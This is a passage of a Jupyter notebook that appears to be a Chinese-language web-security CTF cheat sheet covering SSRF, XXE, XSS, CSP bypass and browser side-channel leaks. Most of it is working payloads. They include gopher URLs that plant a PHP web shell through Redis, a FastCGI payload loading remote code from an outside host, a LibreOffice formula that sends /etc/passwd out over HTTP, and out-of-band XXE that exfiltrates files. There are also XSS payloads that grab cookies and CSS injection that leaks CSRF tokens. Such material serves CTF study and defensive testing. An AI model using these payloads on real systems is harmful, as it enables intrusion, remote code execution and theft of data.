    "{{constructor.constructor('alert(1)')()}}\n",
    "https://github.com/dotboris/vuejs-serverside-template-xss"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Python"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### %"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "輸入%(passowrd)s即可偷到密碼：\n",
    "userdata = {\"user\" : \"kaibro\", \"password\" : \"ggininder\" }\n",
    "passwd  = raw_input(\"Password: \")\n",
    "if passwd != userdata[\"password\"]:\n",
    "    print (\"Password \" + passwd + \" is wrong for user %(user)s\") % userdata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### f"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "python 3.6\n",
    "example\n",
    "    a=\"gg\"\n",
    "    b=f\"{a} ininder\"\n",
    "    >>> gg ininder\n",
    "example2\n",
    "    f\"{os.system('ls')}\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tool"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://github.com/epinna/tplmap"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SSRF"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Bypass 127.0.0.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "127.0.0.1\n",
    "127.00000.00000.0001\n",
    "localhost\n",
    "127.0.1\n",
    "127.1\n",
    "0.0.0.0\n",
    "0.0\n",
    "0\n",
    "\n",
    "::1\n",
    "::127.0.0.1\n",
    "::ffff:127.0.0.1\n",
    "::1%1\n",
    "\n",
    "127.12.34.56 (127.0.0.1/8)\n",
    "127.0.0.1.xip.io\n",
    "\n",
    "http://2130706433 (decimal)\n",
    "http://0x7f000001\n",
    "http://017700000001\n",
    "http://0x7f.0x0.0x0.0x1\n",
    "http://0177.0.0.1\n",
    "http://0177.01.01.01\n",
    "http://0x7f.1\n",
    "http://[::]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Bypass using Ⓐ Ⓑ Ⓒ Ⓓ"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ\n",
    "http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 內網IP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "10.0.0.0/8\n",
    "172.16.0.0/12\n",
    "192.168.0.0/16"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## XSPA"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "port scan\n",
    "    127.0.0.1:80 => OK\n",
    "    127.0.0.1:87 => Timeout\n",
    "    127.0.0.1:9487 => Timeout"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 302 Redirect Bypass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "用來繞過protocol限制\n",
    "第一次SSRF，網站有做檢查、過濾\n",
    "302跳轉做第二次SSRF沒有檢查"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 本地利用"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### file protocol"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "file:///etc/passwd\n",
    "file:///proc/self/cmdline\n",
    "    看他在跑啥\n",
    "file:///proc/self/exe\n",
    "    dump binary\n",
    "file:///proc/self/environ\n",
    "    讀環境變數\n",
    "curl file://google.com/etc/passwd\n",
    "    新版已修掉\n",
    "    實測libcurl 7.47可work\n",
    "Java原生可列目錄 (netdoc亦可)\n",
    "Perl/Ruby open Command Injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Libreoffice CVE-2018-6871"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "可以使用WEBSERVICE讀本地檔案，e.g./etc/passwd\n",
    "讀出來可以用http往外傳\n",
    "    =COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/&quot;&amp;COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;))\n",
    "    e.g. DCTF 2018 final, FBCTF 2019 https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/README_en.md\n",
    "Example Payload: Link  https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/flag.fods"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 遠程利用"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Gopher"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "可偽造任意TCP，hen蚌\n",
    "gopher://127.0.0.1:5278/xGG%0d%0aININDER"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 常見例子"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Struts2\n",
    "    S2-016\n",
    "        action:、redirect:、redirectAction:\n",
    "        index.do?redirect:${new java.lang.ProcessBuilder('id').start()}\n",
    "\n",
    "ElasticSearch\n",
    "    default port: 9200\n",
    "\n",
    "Redis\n",
    "default port: 6379\n",
    "    用SAVE寫shell\n",
    "        FLUSHALL \n",
    "        SET myshell \"<?php system($_GET['cmd']) ?>\"\n",
    "        CONFIG SET DIR /www \n",
    "        CONFIG SET DBFILENAME shell.php \n",
    "        SAVE\n",
    "        QUIT\n",
    "\n",
    "    URLencoded payload: gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT\n",
    "\n",
    "FastCGI\n",
    "    default port: 9000\n",
    "    example\n",
    "        Discuz Pwn\n",
    "        302.php: <?php header( \"Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00\" );\n",
    "        x: <?php system($_GET['cmd']); ?>\n",
    "        visit: /forum.php?mod=ajax&action=downremoteimg&message=[img]http://kaibro.tw/302.php?.jpg[/img]\n",
    "\n",
    "MySQL\n",
    "    無密碼認證可以SSRF\n",
    "    MySQL Client與Server交互主要分兩階段\n",
    "        Connection Phase\n",
    "        Command Phase\n",
    "    gopher://127.0.0.1:3306/_<PAYLOAD>\n",
    "    Tool: https://github.com/undefinedd/extract0r-\n",
    "            \n",
    "\n",
    "Tomcat\n",
    "    透過 tomcat manager 部署 war\n",
    "    要先有帳密，可以從 tomcat-users.xml 讀，或是踹預設密碼\n",
    "    Tool: https://github.com/pimps/gopher-tomcat-deployer\n",
    "    e.g. CTFZone 2019 qual - Catcontrol  https://github.com/w181496/CTF/tree/master/CTFZone-2019-qual/Catcontrol\n",
    "\n",
    "Docker\n",
    "    Remote api未授權訪問\n",
    "    開一個container，掛載/root/，寫ssh key\n",
    "    寫crontab彈shell\n",
    "    docker -H tcp://ip xxxx\n",
    "    \n",
    "\n",
    "ImageMagick - CVE-2016-3718\n",
    "    可以發送HTTP或FTP request\n",
    "    payload: ssrf.mvg\n",
    "    push graphic-context\n",
    "    viewbox 0 0 640 480\n",
    "    fill 'url(http://example.com/)'\n",
    "    pop graphic-context\n",
    "    $ convert ssrf.mvg out.png"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CRLF injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### SMTP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SECCON 2017 SqlSRF:\n",
    "\n",
    "127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckaibrotw%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### FingerPrint"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### dict"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "dict://evil.com:5566\n",
    "\n",
    "$ nc -vl 5566\n",
    "Listening on [0.0.0.0] (family 0, port 5278)\n",
    "Connection from [x.x.x.x] port 5566 [tcp/*] accepted (family 2, sport 40790)\n",
    "CLIENT libcurl 7.35.0\n",
    "\n",
    "-> libcurl version"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### sftp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "sftp://evil.com:5566\n",
    "\n",
    "$ nc -vl 5566\n",
    "Listening on [0.0.0.0] (family 0, port 5278)\n",
    "Connection from [x.x.x.x] port 5278 [tcp/*] accepted (family 2, sport 40810)\n",
    "SSH-2.0-libssh2_1.4.2\n",
    "\n",
    "-> ssh version"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Content-Length"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "送超大Content-length\n",
    "連線hang住判斷是否為HTTP Service"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### UDP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "tftp\n",
    "tftp://evil.com:5566/TEST\n",
    "syslog"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## SSRF Bible:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Testing Payload:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://github.com/cujanovic/SSRF-Testing"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# XXE"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 內部實體"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<!DOCTYPE kaibro[\n",
    "    <!ENTITY param \"hello\">\n",
    "]>\n",
    "<root>&param;</root>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 外部實體"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "libxml2.9.0以後，預設不解析外部實體\n",
    "simplexml_load_file()舊版本中預設解析實體，但新版要指定第三個參數LIBXML_NOENT\n",
    "SimpleXMLElement is a class in PHP\n",
    "http://php.net/manual/en/class.simplexmlelement.php\n",
    "<!DOCTYPE kaibro[\n",
    "    <!ENTITY xxe SYSTEM \"http://kaibro.tw/xxe.txt\">\n",
    "]>\n",
    "<root>&xxe;</root>\n",
    "<!DOCTYPE kaibro[\n",
    "    <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n",
    "]>\n",
    "<root>&xxe;</root>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## XXE on Windows"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<!DOCTYPE kaibro[\n",
    "    <!ENTITY xxe SYSTEM \"\\\\12.34.56.78\">\n",
    "]>\n",
    "<root>&xxe;</root>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 參數實體"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<!DOCTYPE kaibro[\n",
    "    <!ENTITY % remote SYSTEM \"http://kaibro.tw/xxe.dtd\">\n",
    "    %remote;\n",
    "]>\n",
    "<root>&b;</root>\n",
    "xxe.dtd: <!ENTITY b SYSTEM \"file:///etc/passwd\">"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Out of Band (OOB) XXE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Blind 無回顯\n",
    "<?xml version=\"1.0\"?>\n",
    "<!DOCTYPE ANY[\n",
    "<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/xxe/test.php\">\n",
    "<!ENTITY % remote SYSTEM \"http://kaibro.tw/xxe.dtd\">\n",
    "%remote;\n",
    "%all;\n",
    "%send;\n",
    "]>\n",
    "xxe.dtd:\n",
    "\n",
    "<!ENTITY % all \"<!ENTITY &#37; send SYSTEM 'http://kaibro.tw/?a=%file;'>\">"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## DoS"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Billion Laugh Attack\n",
    "<!DOCTYPE data [\n",
    "<!ENTITY a0 \"dos\" >\n",
    "<!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">\n",
    "<!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\">\n",
    "<!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\">\n",
    "<!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">\n",
    "]>\n",
    "<data>&a4;</data>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 串Phar反序列化"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?xml version=\"1.0\" standalone=\"yes\"?>\n",
    "<!DOCTYPE ernw [ \n",
    "    <!ENTITY xxe SYSTEM \"phar:///var/www/html/images/gginin/xxxx.jpeg\" > ]>\n",
    "    <svg width=\"500px\" height=\"100px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n",
    "    <text font-family=\"Verdana\" font-size=\"16\" x=\"10\" y=\"40\">&xxe;</text>\n",
    "</svg>\n",
    "\n",
    "Example: MidnightSun CTF - Rubenscube\n",
    "    https://github.com/w181496/CTF/tree/master/midnightsun2019/Rubenscube"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Error-based XXE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?> \n",
    "<!DOCTYPE message[ \n",
    "  <!ELEMENT message ANY >\n",
    "  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM \"file:///flag\">\n",
    "  <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\n",
    "&#x25;eval;\n",
    "&#x25;error;\n",
    "'>\n",
    "%NUMBER;\n",
    "]> \n",
    "<message>a</message>\n",
    "Example: Google CTF 2019 Qual - bnv\n",
    "    https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/README_en.md"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 其它"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "DOCX\n",
    "XLSX\n",
    "PPTX\n",
    "PDF\n",
    "https://github.com/BuffaloWill/oxml_xxe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Frontend"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## XSS"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Basic Payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<script>alert(1)</script>\n",
    "<svg/onload=alert(1)>\n",
    "<img src=# onerror=alert(1)>\n",
    "<a href=\"javascript:alert(1)\">g</a>\n",
    "<input type=\"text\" value=\"g\" onmouseover=\"alert(1)\" />\n",
    "<iframe src=\"javascript:alert(1)\"></iframe>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Testing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<script>alert(1)</script>\n",
    "'\"><script>alert(1)</script>\n",
    "<img/src=@ onerror=alert(1)/>\n",
    "'\"><img/src=@ onerror=alert(1)/>\n",
    "' onmouseover=alert(1) x='\n",
    "\" onmouseover=alert(1) x=\"\n",
    "`onmouseover=alert(1) x=`\n",
    "javascript:alert(1)//"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 繞過"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "//(javascript註解)被過濾時，可以利用算數運算符代替\n",
    "<a href=\"javascript:alert(1)-abcde\">xss</a>\n",
    "\n",
    "HTML特性\n",
    "    不分大小寫\n",
    "        <ScRipT>\n",
    "        <img SrC=#>\n",
    "    屬性值\n",
    "        src=\"#\"\n",
    "        src='#'\n",
    "        src=#\n",
    "        src=`#` (IE)\n",
    "        \n",
    "編碼繞過\n",
    "    <svg/onload=alert(1)>\n",
    "    <svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;> (16進位) (分號可去掉)\n",
    "    \n",
    "繞空白\n",
    "    <img/src='1'/onerror=alert(0)>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 其他"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "特殊標籤\n",
    "    以下標籤中的腳本無法執行\n",
    "    <title>, <textarea>, <iframe>, <plaintext>, <noscript>...\n",
    "    \n",
    "偽協議\n",
    "    javascript:\n",
    "        <a href=javascript:alert(1) >xss</a>\n",
    "    data:\n",
    "        <a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>xss</a>\n",
    "            \n",
    "Javascript自解碼機制\n",
    "    <input type=\"button\" onclick=\"document.write('&lt;img src=@ onerror=alert(1) /&gt;')\" />\n",
    "    會成功alert(1)，因為javascript位於HTML中，在執行javascript前會先解碼HTML編碼\n",
    "    但若是包在<script>中的javascript，不會解碼HTML編碼\n",
    "    此編碼為HTML entity和&#xH;(hex), &#D;(dec)形式\n",
    "    \n",
    "Javascript中有三套編碼/解碼函數\n",
    "    escape/unescape\n",
    "    encodeURI/decodeURI\n",
    "    encodeURIComponent/decodeURICompinent\n",
    "\n",
    "一些alert(document.domain)的方法\n",
    "    (alert)(document.domain);\n",
    "    al\\u0065rt(document.domain);\n",
    "    al\\u{65}rt(document.domain);\n",
    "    window['alert'](document.domain);\n",
    "    alert.call(null,document.domain);\n",
    "    alert.bind()(document.domain);\n",
    "    https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309\n",
    "        \n",
    "Some Payload\n",
    "    <svg/onload=alert(1);alert(2)>\n",
    "    <svg/onload=\"alert(1);alert(2)\">\n",
    "    <svg/onload=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;;alert(2)\">\n",
    "        ;;改成;會失敗\n",
    "        雙引號可去掉\n",
    "        可10進位, 16進位混合\n",
    "    <svg/onload=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>\n",
    "        \\u形式只能用在javascript，例如onload的a改成\\u0061會失敗\n",
    "    <title><a href=\"</title><svg/onload=alert(1)>\n",
    "        title優先權較大，直接中斷其他標籤\n",
    "    <svg><script>prompt&#40;1)</script>\n",
    "        因為<svg>，HTML Entities會被解析\n",
    "        去掉<svg>會失敗，<script>不會解析Entities\n",
    "    <? foo=\"><script>alert(1)</script>\">\n",
    "    <! foo=\"><script>alert(1)</script>\">\n",
    "    </ foo=\"><script>alert(1)</script>\">\n",
    "    <% foo=\"><script>alert(1)</script>\">\n",
    "    \n",
    "Markdown XSS\n",
    "    [a](javascript:prompt(document.cookie))\n",
    "    [a](j a v a s c r i p t:prompt(document.cookie))\n",
    "    [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n",
    "    [a](javascript:window.onerror=alert;throw%201)\n",
    "    \n",
    "SVG XSS\n",
    "    <?xml version=\"1.0\" standalone=\"no\"?>\n",
    "    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n",
    "\n",
    "    <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n",
    "      <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n",
    "      <script type=\"text/javascript\">\n",
    "        alert(document.domain);\n",
    "      </script>\n",
    "    </svg>\n",
    "    \n",
    "Polyglot XSS\n",
    "    Example: PlaidCTF 2018 wave XSS\n",
    "    上傳.wave檔 (會檢查signatures)\n",
    "      RIFF`....WAVE...` \n",
    "      alert(1); \n",
    "      function RIFF(){}\n",
    "    變成合法的js語法\n",
    "    wave在apache mime type中沒有被定義\n",
    "    <script src=\"uploads/this_file.wave\">\n",
    "    \n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CSP evaluator"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://csp-evaluator.withgoogle.com/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Bypass CSP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### base"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "改變資源載入的域，引入惡意的js\n",
    "<base href =\"http://kaibro.tw/\">\n",
    "RCTF 2018 - rBlog"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### script nonce"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<p>可控內容<p>\n",
    " <script src=\"xxx\" nonce=\"AAAAAAAAAAA\"></script>\n",
    "插入<script src=\"http//kaibro.tw/uccu.js\" a=\"\n",
    "\n",
    " <p><script src=\"http//kaibro.tw/uccu.js\" a=\"<p>\n",
    " <script src=\"xxx\" nonce=\"AAAAAAAAAAA\"></script>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Script Gadget"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf\n",
    "is an existing JS code on the page that may be used to bypass mitigations\n",
    "Bypassing CSP strict-dynamic via Bootstrap\n",
    "    <div data-toggle=tooltip data-html=true title='<script>alert(1)</script>'></div>\n",
    "Bypassing sanitizers via jQuery Mobile\n",
    "    <div data-role=popup id='--><script>alert(1)</script>'></div>\n",
    "Bypassing NoScript via Closure (DOM clobbering)\n",
    "    <a id=CLOSURE_BASE_PATH href=http://attacker/xss></a>\n",
    "Bypassing ModSecurity CRS via Dojo Toolkit\n",
    "    <div data-dojo-type=\"dijit/Declaration\" data-dojo-props=\"}-alert(1)-{\">\n",
    "Bypassing CSP unsafe-eval via underscore templates\n",
    "    <div type=underscore/template> <% alert(1) %> </div>\n",
    "0CTF 2018 - h4xors.club2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### google analytics ea"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ea is used to log actions and can contain arbitrary string\n",
    "Google CTF 2018 - gcalc2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Online Encoding / Decoding"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "http://monyer.com/demo/monyerjs/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## JSFuck"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "http://www.jsfuck.com/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## aaencode / aadecode"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "http://utf-8.jp/public/aaencode.html\n",
    "https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## RPO"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "http://example.com/a%2findex.php\n",
    "    瀏覽器會把a%2findex.php當成一個檔案\n",
    "    Web Server則會正常解析成a/index.php\n",
    "    所以當使用相對路徑載入css時，就可以透過這種方式讓瀏覽器解析到其他層目錄下的檔案\n",
    "    如果該檔案內容可控，則有機會XSS\n",
    "    舉例：\n",
    "        /test.php中有<link href=\"1/\" ...>\n",
    "        另有/1/index.php給?query=參數，會直接輸出該參數內容\n",
    "        訪問/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php就會讓背景變紅色\n",
    "        Server: /test.php\n",
    "        Browser: /1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php\n",
    "        CSS會載入/1/?query={}*{background-color:red}/../../1/\n",
    "        CSS語法容錯率很高"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CSS Injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "CSS可控時，可以Leak Information\n",
    "Example:\n",
    "    leak <input type='hidden' name='csrf' value='2e3d04bf...'>\n",
    "    input[name=csrf][value^=\"2\"]{background: url(http://kaibro.tw/2)}\n",
    "    input[name=csrf][value^=\"2e\"]{background: url(http://kaibro.tw/2e)}\n",
    "    ...\n",
    "    SECCON CTF 2018 - GhostKingdom"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## XS-Leaks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Cross-Site Browser Side channel attack\n",
    "xsleaks wiki   https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Frame count"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "不同狀態有不同數量的frame\n",
    "用 window.frames.length 來判斷\n",
    "    狀態A => frame count = x\n",
    "    狀態B => frame count = y\n",
    "    x != y\n",
    "e.g. Facebook CTF - Secret Note Keeper\n",
    "    找到結果 => frame count >= 1\n",
    "    沒找到 => frame count = 0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Timing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "不同狀態有不同回應時間\n",
    "Time(有結果) > Time(沒結果)\n",
    "有結果時，會需要載入比較多東西"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## XSS Filter"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "iframe正常訪問，會觸發一次onload事件\n",
    "在iframe.src尾，加上#做請求，正常不會再觸發onload事件\n",
    "但如果原本頁面被filter block，則會有第二次onload\n",
    "第二次請求變成chrome-error://chromewebdata/#\n",
    "可以判斷頁面狀態\n",
    "正常 => 1次onload\n",
    "被Blocked => 2次onload\n",
    "也能用history.length判斷\n",
    "e.g. 35C3 - filemanager"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## HTTP Cache"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
